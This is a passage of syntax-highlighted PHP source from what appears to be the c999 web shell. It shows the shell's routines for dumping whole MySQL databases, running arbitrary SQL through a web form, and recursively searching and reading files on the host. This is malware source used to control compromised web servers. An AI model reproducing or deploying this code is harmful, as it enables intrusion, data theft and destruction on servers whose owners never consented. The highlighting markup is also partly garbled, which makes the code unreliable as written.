<span class="s2"># DB: </span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$db</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2"></span>
<span class="s2">#---------------------------------------------------------</span>
<span class="s2">&quot;</span><span class="p">;</span>
 <span class="nv">$c</span> <span class="o">=</span> <span class="nb">count</span><span class="p">(</span><span class="nv">$onlytabs</span><span class="p">);</span>
 <span class="k">foreach</span><span class="p">(</span><span class="nv">$tabs</span> <span class="k">as</span> <span class="nv">$tab</span><span class="p">)</span>
 <span class="p">{</span>
  <span class="k">if</span> <span class="p">((</span><span class="nb">in_array</span><span class="p">(</span><span class="nv">$tab</span><span class="p">,</span><span class="nv">$onlytabs</span><span class="p">))</span> <span class="k">or</span> <span class="p">(</span><span class="o">!</span><span class="nv">$c</span><span class="p">))</span>
  <span class="p">{</span>
   <span class="k">if</span> <span class="p">(</span><span class="nv">$add_drop</span><span class="p">)</span> <span class="p">{</span><span class="nv">$out</span> <span class="o">.=</span> <span class="s2">&quot;DROP TABLE IF EXISTS `&quot;</span><span class="o">.</span><span class="nv">$tab</span><span class="o">.</span><span class="s2">&quot;`;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;}</span>
   <span class="c1">// recieve query for create table structure</span>
   <span class="nv">$res</span> <span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="s2">&quot;SHOW CREATE TABLE `&quot;</span><span class="o">.</span><span class="nv">$tab</span><span class="o">.</span><span class="s2">&quot;`&quot;</span><span class="p">,</span> <span class="nv">$sock</span><span class="p">);</span>
   <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$res</span><span class="p">)</span> <span class="p">{</span><span class="nv">$ret</span><span class="p">[</span><span class="s2">&quot;err&quot;</span><span class="p">][]</span> <span class="o">=</span> <span class="nx">mysql_smarterror</span><span class="p">();}</span>
   <span class="k">else</span>
   <span class="p">{</span>
    <span class="nv">$row</span> <span class="o">=</span> <span class="nb">mysql_fetch_row</span><span class="p">(</span><span class="nv">$res</span><span class="p">);</span>
    <span class="nv">$out</span> <span class="o">.=</span> <span class="nv">$row</span><span class="p">[</span><span class="s2">&quot;1&quot;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;;</span><span class="se">\n\n</span><span class="s2">&quot;</span><span class="p">;</span>
    <span class="c1">// recieve table variables</span>
    <span class="nv">$res</span> <span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="s2">&quot;SELECT * FROM `</span><span class="si">$tab</span><span class="s2">`&quot;</span><span class="p">,</span> <span class="nv">$sock</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="nb">mysql_num_rows</span><span class="p">(</span><span class="nv">$res</span><span class="p">)</span> <span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="mi">0</span><span class="p">)</span>
    <span class="p">{</span>
     <span class="k">while</span> <span class="p">(</span><span class="nv">$row</span> <span class="o">=</span> <span class="nb">mysql_fetch_assoc</span><span class="p">(</span><span class="nv">$res</span><span class="p">))</span>
     <span class="p">{</span>
      <span class="nv">$keys</span> <span class="o">=</span> <span class="nb">implode</span><span class="p">(</span><span class="s2">&quot;`, `&quot;</span><span class="p">,</span> <span class="nb">array_keys</span><span class="p">(</span><span class="nv">$row</span><span class="p">));</span>
      <span class="nv">$values</span> <span class="o">=</span> <span class="nb">array_values</span><span class="p">(</span><span class="nv">$row</span><span class="p">);</span>
      <span class="k">foreach</span><span class="p">(</span><span class="nv">$values</span> <span class="k">as</span> <span class="nv">$k</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nv">$v</span><span class="p">)</span> <span class="p">{</span><span class="nv">$values</span><span class="p">[</span><span class="nv">$k</span><span class="p">]</span> <span class="o">=</span> <span class="nb">addslashes</span><span class="p">(</span><span class="nv">$v</span><span class="p">);}</span>
      <span class="nv">$values</span> <span class="o">=</span> <span class="nb">implode</span><span class="p">(</span><span class="s2">&quot;&#39;, &#39;&quot;</span><span class="p">,</span> <span class="nv">$values</span><span class="p">);</span>
      <span class="nv">$sql</span> <span class="o">=</span> <span class="s2">&quot;INSERT INTO `</span><span class="si">$tab</span><span class="s2">`(`&quot;</span><span class="o">.</span><span class="nv">$keys</span><span class="o">.</span><span class="s2">&quot;`) VALUES (&#39;&quot;</span><span class="o">.</span><span class="nv">$values</span><span class="o">.</span><span class="s2">&quot;&#39;);</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
      <span class="nv">$out</span> <span class="o">.=</span> <span class="nv">$sql</span><span class="p">;</span>
     <span class="p">}</span>
    <span class="p">}</span>
   <span class="p">}</span>
  <span class="p">}</span>
 <span class="p">}</span>
 <span class="nv">$out</span> <span class="o">.=</span> <span class="s2">&quot;#---------------------------------------------------------------------------------</span><span class="se">\n\n</span><span class="s2">&quot;</span><span class="p">;</span>
 <span class="k">if</span> <span class="p">(</span><span class="nv">$file</span><span class="p">)</span>
 <span class="p">{</span>
  <span class="nv">$fp</span> <span class="o">=</span> <span class="nb">fopen</span><span class="p">(</span><span class="nv">$file</span><span class="p">,</span> <span class="s2">&quot;w&quot;</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$fp</span><span class="p">)</span> <span class="p">{</span><span class="nv">$ret</span><span class="p">[</span><span class="s2">&quot;err&quot;</span><span class="p">][]</span> <span class="o">=</span> <span class="mi">2</span><span class="p">;}</span>
  <span class="k">else</span>
  <span class="p">{</span>
   <span class="nb">fwrite</span> <span class="p">(</span><span class="nv">$fp</span><span class="p">,</span> <span class="nv">$out</span><span class="p">);</span>
   <span class="nb">fclose</span> <span class="p">(</span><span class="nv">$fp</span><span class="p">);</span>
  <span class="p">}</span>
 <span class="p">}</span>
 <span class="k">if</span> <span class="p">(</span><span class="nv">$print</span><span class="p">)</span> <span class="p">{</span><span class="k">if</span> <span class="p">(</span><span class="nv">$nl2br</span><span class="p">)</span> <span class="p">{</span><span class="k">echo</span> <span class="nb">nl2br</span><span class="p">(</span><span class="nv">$out</span><span class="p">);}</span> <span class="k">else</span> <span class="p">{</span><span class="k">echo</span> <span class="nv">$out</span><span class="p">;}}</span>
 <span class="k">return</span> <span class="nv">$out</span><span class="p">;</span>
<span class="p">}</span>
<span class="p">}</span>
<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">function_exists</span><span class="p">(</span><span class="s2">&quot;mysql_buildwhere&quot;</span><span class="p">))</span>
<span class="p">{</span>
<span class="k">function</span> <span class="nf">mysql_buildwhere</span><span class="p">(</span><span class="nv">$array</span><span class="p">,</span><span class="nv">$sep</span><span class="o">=</span><span class="s2">&quot; and&quot;</span><span class="p">,</span><span class="nv">$functs</span><span class="o">=</span><span class="k">array</span><span class="p">())</span>
<span class="p">{</span>
 <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">is_array</span><span class="p">(</span><span class="nv">$array</span><span class="p">))</span> <span class="p">{</span><span class="nv">$array</span> <span class="o">=</span> <span class="k">array</span><span class="p">();}</span>
 <span class="nv">$result</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span>
 <span class="k">foreach</span><span class="p">(</span><span class="nv">$array</span> <span class="k">as</span> <span class="nv">$k</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nv">$v</span><span class="p">)</span>
 <span class="p">{</span>
  <span class="nv">$value</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span>
  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$functs</span><span class="p">[</span><span class="nv">$k</span><span class="p">]))</span> <span class="p">{</span><span class="nv">$value</span> <span class="o">.=</span> <span class="nv">$functs</span><span class="p">[</span><span class="nv">$k</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;(&quot;</span><span class="p">;}</span>
  <span class="nv">$value</span> <span class="o">.=</span> <span class="s2">&quot;&#39;&quot;</span><span class="o">.</span><span class="nb">addslashes</span><span class="p">(</span><span class="nv">$v</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&#39;&quot;</span><span class="p">;</span>
  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$functs</span><span class="p">[</span><span class="nv">$k</span><span class="p">]))</span> <span class="p">{</span><span class="nv">$value</span> <span class="o">.=</span> <span class="s2">&quot;)&quot;</span><span class="p">;}</span>
  <span class="nv">$result</span> <span class="o">.=</span> <span class="s2">&quot;`&quot;</span><span class="o">.</span><span class="nv">$k</span><span class="o">.</span><span class="s2">&quot;` = &quot;</span><span class="o">.</span><span class="nv">$value</span><span class="o">.</span><span class="nv">$sep</span><span class="p">;</span>
 <span class="p">}</span>
 <span class="nv">$result</span> <span class="o">=</span> <span class="nb">substr</span><span class="p">(</span><span class="nv">$result</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$result</span><span class="p">)</span><span class="o">-</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$sep</span><span class="p">));</span>
 <span class="k">return</span> <span class="nv">$result</span><span class="p">;</span>
<span class="p">}</span>
<span class="p">}</span>
<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">function_exists</span><span class="p">(</span><span class="s2">&quot;mysql_fetch_all&quot;</span><span class="p">))</span>
<span class="p">{</span>
<span class="k">function</span> <span class="nf">mysql_fetch_all</span><span class="p">(</span><span class="nv">$query</span><span class="p">,</span><span class="nv">$sock</span><span class="p">)</span>
<span class="p">{</span>
 <span class="k">if</span> <span class="p">(</span><span class="nv">$sock</span><span class="p">)</span> <span class="p">{</span><span class="nv">$result</span> <span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="nv">$query</span><span class="p">,</span><span class="nv">$sock</span><span class="p">);}</span>
 <span class="k">else</span> <span class="p">{</span><span class="nv">$result</span> <span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="nv">$query</span><span class="p">);}</span>
 <span class="nv">$array</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
 <span class="k">while</span> <span class="p">(</span><span class="nv">$row</span> <span class="o">=</span> <span class="nb">mysql_fetch_array</span><span class="p">(</span><span class="nv">$result</span><span class="p">))</span> <span class="p">{</span><span class="nv">$array</span><span class="p">[]</span> <span class="o">=</span> <span class="nv">$row</span><span class="p">;}</span>
 <span class="nb">mysql_free_result</span><span class="p">(</span><span class="nv">$result</span><span class="p">);</span>
 <span class="k">return</span> <span class="nv">$array</span><span class="p">;</span>
<span class="p">}</span>
<span class="p">}</span>
<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">function_exists</span><span class="p">(</span><span class="s2">&quot;mysql_smarterror&quot;</span><span class="p">))</span>
<span class="p">{</span>
<span class="k">function</span> <span class="nf">mysql_smarterror</span><span class="p">(</span><span class="nv">$type</span><span class="p">,</span><span class="nv">$sock</span><span class="p">)</span>
<span class="p">{</span>
 <span class="k">if</span> <span class="p">(</span><span class="nv">$sock</span><span class="p">)</span> <span class="p">{</span><span class="nv">$error</span> <span class="o">=</span> <span class="nb">mysql_error</span><span class="p">(</span><span class="nv">$sock</span><span class="p">);}</span>
 <span class="k">else</span> <span class="p">{</span><span class="nv">$error</span> <span class="o">=</span> <span class="nb">mysql_error</span><span class="p">();}</span>
 <span class="nv">$error</span> <span class="o">=</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$error</span><span class="p">);</span>
 <span class="k">return</span> <span class="nv">$error</span><span class="p">;</span>
<span class="p">}</span>
<span class="p">}</span>
<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">function_exists</span><span class="p">(</span><span class="s2">&quot;mysql_query_form&quot;</span><span class="p">))</span>
<span class="p">{</span>
<span class="k">function</span> <span class="nf">mysql_query_form</span><span class="p">()</span>
<span class="p">{</span>
 <span class="k">global</span> <span class="nv">$submit</span><span class="p">,</span><span class="nv">$sql_act</span><span class="p">,</span><span class="nv">$sql_query</span><span class="p">,</span><span class="nv">$sql_query_result</span><span class="p">,</span><span class="nv">$sql_confirm</span><span class="p">,</span><span class="nv">$sql_query_error</span><span class="p">,</span><span class="nv">$tbl_struct</span><span class="p">;</span>
 <span class="k">if</span> <span class="p">((</span><span class="nv">$submit</span><span class="p">)</span> <span class="k">and</span> <span class="p">(</span><span class="o">!</span><span class="nv">$sql_query_result</span><span class="p">)</span> <span class="k">and</span> <span class="p">(</span><span class="nv">$sql_confirm</span><span class="p">))</span> <span class="p">{</span><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$sql_query_error</span><span class="p">)</span> <span class="p">{</span><span class="nv">$sql_query_error</span> <span class="o">=</span> <span class="s2">&quot;Query was empty&quot;</span><span class="p">;}</span> <span class="k">echo</span> <span class="s2">&quot;&amp;lt;b&amp;gt;Error:&amp;lt;/b&amp;gt;</span>
<span class="s2">&quot;</span><span class="o">.</span><span class="nv">$sql_query_error</span><span class="o">.</span><span class="s2">&quot;</span>
<span class="s2">&quot;</span><span class="p">;}</span>
 <span class="k">if</span> <span class="p">(</span><span class="nv">$sql_query_result</span> <span class="k">or</span> <span class="p">(</span><span class="o">!</span><span class="nv">$sql_confirm</span><span class="p">))</span> <span class="p">{</span><span class="nv">$sql_act</span> <span class="o">=</span> <span class="nv">$sql_goto</span><span class="p">;}</span>
 <span class="k">if</span> <span class="p">((</span><span class="o">!</span><span class="nv">$submit</span><span class="p">)</span> <span class="k">or</span> <span class="p">(</span><span class="nv">$sql_act</span><span class="p">))</span>
 <span class="p">{</span>
  <span class="k">echo</span> <span class="s2">&quot;&amp;lt;/pre&amp;gt;</span>
<span class="s2">&quot;</span><span class="p">;</span> <span class="k">if</span> <span class="p">(</span><span class="nv">$tbl_struct</span><span class="p">)</span> <span class="p">{</span> <span class="k">echo</span> <span class="s2">&quot;</span>
<span class="s2">&amp;lt;table border=&quot;</span><span class="mi">0</span><span class="s2">&quot;&amp;gt;</span>
<span class="s2">&amp;lt;tbody&amp;gt;</span>
<span class="s2">&amp;lt;tr&amp;gt;</span>
<span class="s2">&amp;lt;td&amp;gt;&amp;lt;form method=&quot;</span><span class="nx">POST</span><span class="s2">&quot; name=&quot;</span><span class="nx">\</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="nx">c999sh_sqlquery\</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="s2">&quot;&amp;gt;&amp;lt;b&amp;gt;&quot;</span><span class="p">;</span> <span class="k">if</span> <span class="p">((</span><span class="nv">$sql_query</span><span class="p">)</span> <span class="k">and</span> <span class="p">(</span><span class="o">!</span><span class="nv">$submit</span><span class="p">))</span> <span class="p">{</span><span class="k">echo</span> <span class="s2">&quot;Do you really want to&quot;</span><span class="p">;}</span> <span class="k">else</span> <span class="p">{</span><span class="k">echo</span> <span class="s2">&quot;SQL-Query&quot;</span><span class="p">;}</span> <span class="k">echo</span> <span class="s2">&quot;:&amp;lt;/b&amp;gt;</span>

<span class="s2">&amp;lt;textarea cols=&quot;</span><span class="mi">100</span><span class="s2">&quot; name=&quot;</span><span class="nx">sql_query</span><span class="s2">&quot; rows=&quot;</span><span class="mi">10</span><span class="s2">&quot;&amp;gt;&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_query</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/textarea&amp;gt;</span>

<span class="s2">&amp;lt;input type=&quot;</span><span class="nx">hidden</span><span class="s2">&quot; name=&quot;</span><span class="nx">act</span><span class="s2">&quot; value=&quot;</span><span class="nx">sql</span><span class="s2">&quot; /&amp;gt;&amp;lt;input type=&quot;</span><span class="nx">hidden</span><span class="s2">&quot; name=&quot;</span><span class="nx">sql_act</span><span class="s2">&quot; value=&quot;</span><span class="nx">query</span><span class="s2">&quot; /&amp;gt;&amp;lt;input type=&quot;</span><span class="nx">hidden</span><span class="s2">&quot; name=&quot;</span><span class="nx">sql_tbl</span><span class="s2">&quot; value=&quot;</span><span class="nx">\</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_tbl</span><span class="p">)</span><span class="o">.&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="nx">\</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="s2">&quot; /&amp;gt;&amp;lt;input type=&quot;</span><span class="nx">hidden</span><span class="s2">&quot; name=&quot;</span><span class="nx">submit</span><span class="s2">&quot; value=&quot;</span><span class="nx">\</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="mi">1</span><span class="nx">\</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="s2">&quot; /&amp;gt;&amp;lt;input type=&quot;</span><span class="nx">hidden</span><span class="s2">&quot; name=&quot;</span><span class="nx">\</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="nx">sql_goto\</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="s2">&quot; value=&quot;</span><span class="nx">\</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_goto</span><span class="p">)</span><span class="o">.&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="nx">\</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="s2">&quot; /&amp;gt;&amp;lt;input type=&quot;</span><span class="nx">submit</span><span class="s2">&quot; name=&quot;</span><span class="nx">sql_confirm</span><span class="s2">&quot; value=&quot;</span><span class="nx">\</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="nx">Yes\</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="s2">&quot; /&amp;gt; &amp;lt;input type=&quot;</span><span class="nx">submit</span><span class="s2">&quot; value=&quot;</span><span class="nx">\</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="nx">No\</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="s2">&quot; /&amp;gt;&amp;lt;/form&amp;gt;&amp;lt;/td&amp;gt;</span>
<span class="s2">&amp;lt;td valign=&quot;</span><span class="nx">\</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="nx">top\</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="s2">&quot;&amp;gt;&amp;lt;b&amp;gt;Fields:&amp;lt;/b&amp;gt;</span>
<span class="s2">&quot;</span><span class="p">;</span>
 <span class="k">foreach</span> <span class="p">(</span><span class="nv">$tbl_struct</span> <span class="k">as</span> <span class="nv">$field</span><span class="p">)</span> <span class="p">{</span><span class="nv">$name</span> <span class="o">=</span> <span class="nv">$field</span><span class="p">[</span><span class="s2">&quot;Field&quot;</span><span class="p">];</span> <span class="k">echo</span> <span class="s2">&quot;� &amp;lt;a onclick=&quot;</span><span class="nx">\</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="nx">document</span><span class="o">.</span><span class="nx">c999sh_sqlquery</span><span class="o">.</span><span class="nx">sql_query</span><span class="o">.</span><span class="nx">value</span><span class="o">+=</span><span class="s1">&#39;`&amp;quot;.$name.&amp;quot;`&#39;</span><span class="p">;</span><span class="nx">\</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="s2">&quot; href=&quot;</span><span class="nx">\</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="c1">#\&amp;quot;&quot;&amp;gt;&amp;lt;b&amp;gt;&quot;.$name.&quot;&amp;lt;/b&amp;gt;&amp;lt;/a&amp;gt;</span>
<span class="s2">&quot;;}</span>
<span class="s2"> echo &quot;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">/</span><span class="nx">td</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span>
<span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">/</span><span class="nx">tr</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span>
<span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">/</span><span class="nx">tbody</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span>
<span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">/</span><span class="nx">table</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span>
<span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">pre</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span>
<span class="s2">&quot;;</span>
<span class="s2"> }</span>
<span class="s2"> }</span>
<span class="s2"> if (</span><span class="si">$sql_query_result</span><span class="s2"> or (!</span><span class="si">$sql_confirm</span><span class="s2">)) </span><span class="si">{</span><span class="nv">$sql_query</span> <span class="o">=</span> <span class="nv">$sql_last_query</span><span class="p">;</span><span class="si">}</span><span class="s2"></span>
<span class="s2">}</span>
<span class="s2">}</span>
<span class="s2">if (!function_exists(&quot;</span><span class="nb">mysql_create_db</span><span class="s2">&quot;))</span>
<span class="s2">{</span>
<span class="s2">function mysql_create_db(</span><span class="si">$db</span><span class="s2">,</span><span class="si">$sock</span><span class="s2">=&quot;&quot;)</span>
<span class="s2">{</span>
<span class="s2"> </span><span class="si">$sql</span><span class="s2"> = &quot;</span><span class="nx">CREATE</span> <span class="nx">DATABASE</span> <span class="sb">`&quot;.addslashes($db).&quot;`</span><span class="p">;</span><span class="s2">&quot;;</span>
<span class="s2"> if (</span><span class="si">$sock</span><span class="s2">) {return mysql_query(</span><span class="si">$sql</span><span class="s2">,</span><span class="si">$sock</span><span class="s2">);}</span>
<span class="s2"> else {return mysql_query(</span><span class="si">$sql</span><span class="s2">);}</span>
<span class="s2">}</span>
<span class="s2">}</span>
<span class="s2">if (!function_exists(&quot;</span><span class="nx">mysql_query_parse</span><span class="s2">&quot;))</span>
<span class="s2">{</span>
<span class="s2">function mysql_query_parse(</span><span class="si">$query</span><span class="s2">)</span>
<span class="s2">{</span>
<span class="s2"> </span><span class="si">$query</span><span class="s2"> = trim(</span><span class="si">$query</span><span class="s2">);</span>
<span class="s2"> </span><span class="si">$arr</span><span class="s2"> = explode (&quot;</span> <span class="s2">&quot;,</span><span class="si">$query</span><span class="s2">);</span>
<span class="s2"> /*array array()</span>
<span class="s2"> {</span>
<span class="s2"> &quot;</span><span class="nx">METHOD</span><span class="s2">&quot;=&amp;gt;array(output_type),</span>
<span class="s2"> &quot;</span><span class="nx">METHOD1</span><span class="s2">&quot;...</span>
<span class="s2"> ...</span>
<span class="s2"> }</span>
<span class="s2"> if output_type == 0, no output,</span>
<span class="s2"> if output_type == 1, no output if no error</span>
<span class="s2"> if output_type == 2, output without control-buttons</span>
<span class="s2"> if output_type == 3, output with control-buttons</span>
<span class="s2"> */</span>
<span class="s2"> </span><span class="si">$types</span><span class="s2"> = array(</span>
<span class="s2"> &quot;</span><span class="nx">SELECT</span><span class="s2">&quot;=&amp;gt;array(3,1),</span>
<span class="s2"> &quot;</span><span class="nx">SHOW</span><span class="s2">&quot;=&amp;gt;array(2,1),</span>
<span class="s2"> &quot;</span><span class="nx">DELETE</span><span class="s2">&quot;=&amp;gt;array(1),</span>
<span class="s2"> &quot;</span><span class="nx">DROP</span><span class="s2">&quot;=&amp;gt;array(1)</span>
<span class="s2"> );</span>
<span class="s2"> </span><span class="si">$result</span><span class="s2"> = array();</span>
<span class="s2"> </span><span class="si">$op</span><span class="s2"> = strtoupper(</span><span class="si">$arr[0]</span><span class="s2">);</span>
<span class="s2"> if (is_array(</span><span class="si">$types[$op]</span><span class="s2">))</span>
<span class="s2"> {</span>
<span class="s2"> </span><span class="si">$result[&quot;propertions&quot;]</span><span class="s2"> = </span><span class="si">$types[$op]</span><span class="s2">;</span>
<span class="s2"> </span><span class="si">$result[&quot;query&quot;]</span><span class="s2"> = </span><span class="si">$query</span><span class="s2">;</span>
<span class="s2"> if (</span><span class="si">$types[$op]</span><span class="s2"> == 2)</span>
<span class="s2"> {</span>
<span class="s2"> foreach(</span><span class="si">$arr</span><span class="s2"> as </span><span class="si">$k</span><span class="s2">=&amp;gt;</span><span class="si">$v</span><span class="s2">)</span>
<span class="s2"> {</span>
<span class="s2"> if (strtoupper(</span><span class="si">$v</span><span class="s2">) == &quot;</span><span class="nx">LIMIT</span><span class="s2">&quot;)</span>
<span class="s2"> {</span>
<span class="s2"> </span><span class="si">$result[&quot;limit&quot;]</span><span class="s2"> = </span><span class="si">$arr[$k+1]</span><span class="s2">;</span>
<span class="s2"> </span><span class="si">$result[&quot;limit&quot;]</span><span class="s2"> = explode(&quot;</span><span class="p">,</span><span class="s2">&quot;,</span><span class="si">$result[&quot;limit&quot;]</span><span class="s2">);</span>
<span class="s2"> if (count(</span><span class="si">$result[&quot;limit&quot;]</span><span class="s2">) == 1) </span><span class="si">{</span><span class="nv">$result</span><span class="p">[</span><span class="s2">&quot;limit&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="nv">$result</span><span class="p">[</span><span class="s2">&quot;limit&quot;</span><span class="p">][</span><span class="mi">0</span><span class="p">]);</span><span class="si">}</span><span class="s2"></span>
<span class="s2"> unset(</span><span class="si">$arr[$k]</span><span class="s2">,</span><span class="si">$arr[$k+1]</span><span class="s2">);</span>
<span class="s2"> }</span>
<span class="s2"> }</span>
<span class="s2"> }</span>
<span class="s2"> }</span>
<span class="s2"> else {return FALSE;}</span>
<span class="s2">}</span>
<span class="s2">}</span>
<span class="s2">if (!function_exists(&quot;</span><span class="nx">c999fsearch</span><span class="s2">&quot;))</span>
<span class="s2">{</span>
<span class="s2">function c999fsearch(</span><span class="si">$d</span><span class="s2">)</span>
<span class="s2">{</span>
<span class="s2"> global </span><span class="si">$found</span><span class="s2">;</span>
<span class="s2"> global </span><span class="si">$found_d</span><span class="s2">;</span>
<span class="s2"> global </span><span class="si">$found_f</span><span class="s2">;</span>
<span class="s2"> global </span><span class="si">$search_i_f</span><span class="s2">;</span>
<span class="s2"> global </span><span class="si">$search_i_d</span><span class="s2">;</span>
<span class="s2"> global </span><span class="si">$a</span><span class="s2">;</span>
<span class="s2"> if (substr(</span><span class="si">$d</span><span class="s2">,-1) != DIRECTORY_SEPARATOR) </span><span class="si">{</span><span class="nv">$d</span> <span class="o">.=</span> <span class="nx">DIRECTORY_SEPARATOR</span><span class="p">;</span><span class="si">}</span><span class="s2"></span>
<span class="s2"> </span><span class="si">$h</span><span class="s2"> = opendir(</span><span class="si">$d</span><span class="s2">);</span>
<span class="s2"> while ((</span><span class="si">$f</span><span class="s2"> = readdir(</span><span class="si">$h</span><span class="s2">)) !== FALSE)</span>
<span class="s2"> {</span>
<span class="s2"> if(</span><span class="si">$f</span><span class="s2"> != &quot;</span><span class="o">.</span><span class="s2">&quot; &amp;&amp; </span><span class="si">$f</span><span class="s2"> != &quot;</span><span class="o">..</span><span class="s2">&quot;)</span>
<span class="s2"> {</span>
<span class="s2"> </span><span class="si">$bool</span><span class="s2"> = (empty(</span><span class="si">$a[&quot;name_regexp&quot;]</span><span class="s2">) and strpos(</span><span class="si">$f</span><span class="s2">,</span><span class="si">$a[&quot;name&quot;]</span><span class="s2">) !== FALSE) || (</span><span class="si">$a[&quot;name_regexp&quot;]</span><span class="s2"> and ereg(</span><span class="si">$a[&quot;name&quot;]</span><span class="s2">,</span><span class="si">$f</span><span class="s2">));</span>
<span class="s2"> if (is_dir(</span><span class="si">$d</span><span class="s2">.</span><span class="si">$f</span><span class="s2">))</span>
<span class="s2"> {</span>
<span class="s2"> </span><span class="si">$search_i_d</span><span class="s2">++;</span>
<span class="s2"> if (empty(</span><span class="si">$a[&quot;text&quot;]</span><span class="s2">) and </span><span class="si">$bool</span><span class="s2">) </span><span class="si">{</span><span class="nv">$found</span><span class="p">[]</span> <span class="o">=</span> <span class="nv">$d</span><span class="o">.</span><span class="nv">$f</span><span class="p">;</span> <span class="nv">$found_d</span><span class="o">++</span><span class="p">;</span><span class="si">}</span><span class="s2"></span>
<span class="s2"> if (!is_link(</span><span class="si">$d</span><span class="s2">.</span><span class="si">$f</span><span class="s2">)) {c999fsearch(</span><span class="si">$d</span><span class="s2">.</span><span class="si">$f</span><span class="s2">);}</span>
<span class="s2"> }</span>
<span class="s2"> else</span>
<span class="s2"> {</span>
<span class="s2"> </span><span class="si">$search_i_f</span><span class="s2">++;</span>
<span class="s2"> if (</span><span class="si">$bool</span><span class="s2">)</span>
<span class="s2"> {</span>
<span class="s2"> if (!empty(</span><span class="si">$a[&quot;text&quot;]</span><span class="s2">))</span>
<span class="s2"> {</span>
<span class="s2"> </span><span class="si">$r</span><span class="s2"> = @file_get_contents(</span><span class="si">$d</span><span class="s2">.</span><span class="si">$f</span><span class="s2">);</span>
<span class="s2"> if (</span><span class="si">$a[&quot;text_wwo&quot;]</span><span class="s2">) </span><span class="si">{</span><span class="nv">$a</span><span class="p">[</span><span class="s2">&quot;text&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="s2">&quot; &quot;</span><span class="o">.</span><span class="nb">trim</span><span class="p">(</span><span class="nv">$a</span><span class="p">[</span><span class="s2">&quot;text&quot;</span><span class="p">])</span><span class="o">.</span><span class="s2">&quot; &quot;</span><span class="p">;</span><span class="si">}</span><span class="s2"></span>
